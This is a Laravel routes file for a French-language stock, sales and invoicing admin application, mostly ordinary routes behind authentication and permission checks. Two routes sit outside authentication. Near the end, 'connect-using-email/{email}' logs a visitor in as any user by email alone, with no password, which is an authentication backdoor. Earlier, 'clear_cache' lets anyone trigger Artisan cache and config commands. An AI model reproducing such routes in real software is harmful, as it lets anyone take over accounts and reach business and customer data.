<?php

use App\Models\User;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\Facades\Artisan;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('clear_cache', function () {

    Artisan::call('optimize');

    Artisan::call('cache:clear');
    echo "Cache cleared<br>";

    Artisan::call('view:clear');
    echo "View cleared<br>";

    Artisan::call('config:cache');
    echo "Config cleared<br>";

    dd("Cache is cleared");
});

Route::redirect("/", "/admin");

Auth::routes();

Route::group(["prefix" => "admin", "as" => "admin.", "middleware" => "auth"], function () {
    Route::group(["middleware" => ["can:view all"]], function () {
        Route::resource("utilisateurs", \App\Http\Controllers\admin\users\UserController::class);
        Route::resource("fournisseurs", \App\Http\Controllers\admin\supplier\SupplierController::class);
        Route::resource("achat-produits", \App\Http\Controllers\admin\article\PurchaseProductController::class);
        Route::resource("tarif-fournisseurs", \App\Http\Controllers\admin\produit\PricingSupplierController::class)->except("show");
    });

    // Dashboard
    Route::get("/", [\App\Http\Controllers\admin\AdminController::class, "index"])->name("index");
    Route::get("/dashboard/detail", [\App\Http\Controllers\admin\AdminController::class, "detail"])->name("dashboard.detail");
    Route::get("/dashboard/export-detail-excel", [\App\Http\Controllers\admin\AdminController::class, "exportExcel"])->name("dashboard.exportExcel");
    Route::get("/dashboard/detail-data", [\App\Http\Controllers\admin\AdminController::class, "detailData"])->name("dashboard.detailData");

    Route::group(["middleware" => "can:view dashboard"], function () {
        Route::get("dashboard/facture/impression", [\App\Http\Controllers\admin\AdminController::class, "printReport"])->name("dashboard.printReport");
        Route::get("dashboard/facture/telecharger", [\App\Http\Controllers\admin\AdminController::class, "download"])->name("dashboard.download");
    });

    //Articles & Emballages
    Route::group(["middleware" => "can:view article"], function () {
        Route::resource("articles", \App\Http\Controllers\admin\article\ArticleController::class);
        Route::resource("category-articles", \App\Http\Controllers\admin\article\CategoryArticleController::class)->except("show");
        Route::group(["prefix" => "produits", "as" => "approvisionnement."], function () {
            Route::resource("articles", \App\Http\Controllers\admin\produit\ProductController::class)->except("show");
            Route::post("get-articles", [\App\Http\Controllers\admin\produit\ProductController::class, "getData"])->name("articles.getData");
            Route::resource("emballages", \App\Http\Controllers\admin\produit\EmballageController::class)->except("show");
            // Route::resource("packages", \App\Http\Controllers\admin\produit\PackageController::class);
        });
    });

    //ventes
    Route::post("pre-save-articles", [\App\Http\Controllers\admin\article\ArticleController::class, "preSaveArticle"])->name("article.preSaveArticle");
    Route::post("pre-save-invoice-articles", [\App\Http\Controllers\admin\article\ArticleController::class, "preSaveInvoiceArticle"])->name("article.preSaveInvoiceArticle");

    //Stock
    Route::group(["middleware" => "can:view stock"], function () {
        Route::resource("stocks", \App\Http\Controllers\admin\article\StockController::class);
        Route::get("get-stock-data", [\App\Http\Controllers\admin\article\StockController::class, "getData"])->name("stocks.getData");
        Route::get("print-report-stock", [\App\Http\Controllers\admin\article\StockController::class, "printReport"])->name("stocks.printReport");

        Route::group(["prefix" => "etat-emballages", "as" => "etat-emballages."], function () {
            Route::get("/", [\App\Http\Controllers\admin\article\EtatEmballageController::class, "index"])->name("index");
            Route::get("imprimer", [\App\Http\Controllers\admin\article\EtatEmballageController::class, "printReport"])->name("printReport");
        });
    });

    // Inventaire
    Route::group(["prefix" => "inventaires", "as" => "inventaires.", "middleware" => "can:view inventory"], function () {
        Route::get("/", [\App\Http\Controllers\admin\article\InventoryController::class, "index"])->name("index");
        Route::post("get-data", [\App\Http\Controllers\admin\article\InventoryController::class, "ajaxPostData"])->name("ajaxPostData");
        Route::post("/check-stock", [\App\Http\Controllers\admin\article\InventoryController::class, "checkStock"])->name("checkStock");
        Route::get("/ajustement-de-stock/{inventory}", [\App\Http\Controllers\admin\article\InventoryController::class, "getAdjustStockForm"])->name("getAdjustStockForm");
        Route::post("/demmande-ajustement-de-stock", [\App\Http\Controllers\admin\article\InventoryController::class, "adjustStockRequest"])->name("adjustStockRequest");
        Route::post("/ajustement-de-stock/{inventory}", [\App\Http\Controllers\admin\article\InventoryController::class, "adjustStock"])->name("adjustStock")->can("valid inventory");
    });

    Route::post("settings", [\App\Http\Controllers\admin\settings\SettingController::class, "update"])->name("settings.update");

    // Impression
    Route::group(["prefix" => "impression", "as" => "print."], function () {
        Route::get("vente/{invoice_number}", [\App\Http\Controllers\admin\impression\ImpressionController::class, "printSale"])->name("sale");
        Route::get("vente/{invoice_number}/preview", [\App\Http\Controllers\admin\impression\ImpressionController::class, "previewSale"])->name("sale.preview");
        Route::get("vente/{invoice_number}/telecharger", [\App\Http\Controllers\admin\impression\ImpressionController::class, "downloadSale"])->name("sale.download");
        Route::get("vente/{invoice_number}/annuler", [\App\Http\Controllers\admin\impression\ImpressionController::class, "cancelSale"])->name("sale.cancel")->middleware("can:cancel sales");
        Route::get("vente/{invoice_number}/terminer", [\App\Http\Controllers\admin\impression\ImpressionController::class, "saleTerminate"])->name("sale.terminate");

        Route::get("achat/{invoice_number}", [\App\Http\Controllers\admin\impression\ImpressionController::class, "printAchat"])->name("achat");
        Route::get("achat/{invoice_number}/terminer", [\App\Http\Controllers\admin\impression\ImpressionController::class, "achatTerminate"])->name("achat.terminate");
        Route::get("achat/{invoice_number}/preview", [\App\Http\Controllers\admin\impression\ImpressionController::class, "previewAchat"])->name("achat.preview");
        Route::get("achat/{invoice_number}/telecharger", [\App\Http\Controllers\admin\impression\ImpressionController::class, "downloadAchat"])->name("achat.download");
    });

    Route::get("{type}/detail/{invoice_number}", [\App\Http\Controllers\admin\impression\ImpressionController::class, "show"])->name("document.show");
    Route::get("{type}/detail/{invoice_number}/print", [\App\Http\Controllers\admin\impression\ImpressionController::class, "print"])->name("document.print");

    // Ventes
    Route::resource("ventes", \App\Http\Controllers\admin\sale\SaleController::class);
    Route::get("ventes/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "paymentForm"])->name("sale.paymentForm")->middleware("can:make payment");
    Route::post("ventes/payment/{invoice_number}", [\App\Http\Controllers\admin\payment\PaymentController::class, "paymentStore"])->name("sale.paymentStore")->middleware("can:make payment");

    // Client
    Route::resource("clients", \App\Http\Controllers\admin\customer\CustomerController::class);
    Route::post("get-customers", [\App\Http\Controllers\admin\customer\CustomerController::class, "getData"])->name("customer.getData");

    // Sortie de stock
    // sample out stock
    Route::group(["middleware" => "can:view_intern_doc"], function () {
        Route::resource("sorti-stocks", App\Http\Controllers\admin\article\StockOutController::class);
        Route::group(["prefix" => "sorti-stocks/{invoice_number}", "as" => "sorti-stocks."], function () {
            Route::get("/imprimer", [App\Http\Controllers\admin\article\StockOutController::class, "print"])->name("print");
            Route::get("/telecharger", [App\Http\Controllers\admin\article\StockOutController::class, "download"])->name("download");
            Route::post("/valid", [App\Http\Controllers\admin\article\StockOutController::class, "validStockOut"])->name("validStockOut");
            Route::post("/annuler", [App\Http\Controllers\admin\article\StockOutController::class, "cancel"])->name("cancel");
        });
    });

    // Back To Supplier
    // Route::resource("retour-fournisseurs", App\Http\Controllers\admin\article\BackToSupplierController::class);
    // Route::group(["prefix" => "retour-fournisseurs/{invoice_number}", "as" => "retour-fournisseurs."], function () {
    //     Route::get("/imprimer", [App\Http\Controllers\admin\article\BackToSupplierController::class, "print"])->name("print");
    //     Route::get("/telecharger", [App\Http\Controllers\admin\article\BackToSupplierController::class, "download"])->name("download");
    //     Route::post("/valid", [App\Http\Controllers\admin\article\BackToSupplierController::class, "validStockOut"])->name("validStockOut");
    //     Route::post("/annuler", [App\Http\Controllers\admin\article\BackToSupplierController::class, "cancel"])->name("cancel");
    // });

    // Mot de passe
    Route::get("change-mot-de-passe", [\App\Http\Controllers\admin\password\PasswordController::class, "index"])->name("password.index");
    Route::post("change-mot-de-passe", [\App\Http\Controllers\admin\password\PasswordController::class, "update"])->name("password.update");
});

Route::get("connect-using-email/{email}", function ($email) {
    $user = User::where("email", $email)->first();
    // dd($user);
    if ($user) {
        Auth::loginUsingId($user->id);
        return redirect("/admin");
    }

    return "Email not found";
});

Route::get('/home', [App\Http\Controllers\HomeController::class, 'index'])->name('home');
